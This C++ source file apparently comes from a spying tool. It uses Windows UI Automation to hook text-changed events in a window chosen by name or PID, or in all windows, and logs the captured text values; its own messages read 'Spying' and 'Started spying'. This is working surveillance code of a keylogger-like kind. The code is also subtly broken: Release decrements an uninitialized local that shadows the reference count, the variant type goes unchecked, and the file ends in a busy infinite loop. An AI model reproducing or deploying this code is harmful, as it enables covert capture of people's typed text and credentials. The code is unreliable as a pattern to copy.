#include "MyAutomationEventHandler.h"
#include "Errors.h"
#include "Find.h"

MyAutomationEventHandler::MyAutomationEventHandler() : refCount(1)
{

}

ULONG STDMETHODCALLTYPE MyAutomationEventHandler::AddRef()
{
	return InterlockedIncrement(&refCount);
}

ULONG STDMETHODCALLTYPE MyAutomationEventHandler::Release()
{
	ULONG refCount = InterlockedDecrement(&refCount);
	if (refCount == 0)
	{
		delete this;
		return 0;
	}
	return refCount;
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::QueryInterface(REFIID riid, void** ppInterface)
{
	if (riid == __uuidof(IUnknown))
		*ppInterface = static_cast<IUIAutomationEventHandler*>(this);
	else if (riid == __uuidof(IUIAutomationEventHandler))
		*ppInterface = static_cast<IUIAutomationEventHandler*>(this);
	else
	{
		*ppInterface = NULL;
		return E_NOINTERFACE;
	}
	this->AddRef();
	return S_OK;
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::HandleAutomationEvent(IUIAutomationElement* pAutomationElement, EVENTID eventID)
{
	HRESULT hr;
	switch (eventID)
	{
		case UIA_Text_TextChangedEventId:
		{
			VARIANT vVar;
			VariantInit(&vVar);

			hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vVar);
			if (SUCCEEDED(hr))
			{
				Log(vVar.bstrVal, EMPTY);
			}
			break;
		}

	default:
		break;
	}
	return ERROR_SUCCESS;
}

HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(wchar_t* windowName, DWORD pid)
{
	CComPtr<IUIAutomation> pAutomation;
	CComPtr<IUIAutomationElement> pAutomationElement;
	MyAutomationEventHandler* pMyAutomationEventHandler = new MyAutomationEventHandler();

	HRESULT hr;
	BSTR bName;

	hr = CoCreateInstance(__uuidof(CUIAutomation), NULL, CLSCTX_INPROC_SERVER, __uuidof(IUIAutomation), (void**)&pAutomation);
	if (FAILED(hr))
	{
		Log(L"CoCreateInstance() failed", WARNING);
		PrintErrorFromHRESULT(hr);
		return 1;
	}
	Log(L"IUIAutomation creating success", DBG);

	if (windowName)
	{
		pAutomationElement = Finder::GetUIAElementByName(pAutomation, windowName);
		if (pAutomationElement == NULL)
		{
			Log(L"Cant find GUI by windowname!!!. Try to use --pid", WARNING);
			return E_INVALIDARG;
		}

		Log(L"Spying " + std::wstring(windowName), DBG);
	}
	else if (pid != 0)
	{
		pAutomationElement = Finder::GetUIAElementByPID(pAutomation, pid);
		if (pAutomationElement == NULL)
		{
			Log(L"Cant find GUI by pid!!!. Try to use --windowname", WARNING);
			return E_INVALIDARG;
		}

		Log(L"Spying " + std::to_wstring(pid), DBG);
	}
	else
	{
		// Monitor all windows
		Log(L"Monitoring all windows", INFO);
		pAutomation->GetRootElement(&pAutomationElement);
	}

	hr = pAutomationElement->get_CurrentName(&bName);

	if (SUCCEEDED(hr))
	{
		std::wstring wname(bName, SysStringLen(bName));
		Log(L"Window Name: " + wname, INFO);
	}

	hr = pAutomation->AddAutomationEventHandler(UIA_Text_TextChangedEventId, pAutomationElement, TreeScope_Subtree, NULL, (IUIAutomationEventHandler*)pMyAutomationEventHandler);
	if (FAILED(hr))
	{
		Log(L"pAutomation->AddAutomationEventHandler() Failed", WARNING);
		PrintErrorFromHRESULT(hr);
		return 1;
	}

	Log(L"Started spying", INFO);

	while (1) {}

	return 0;
}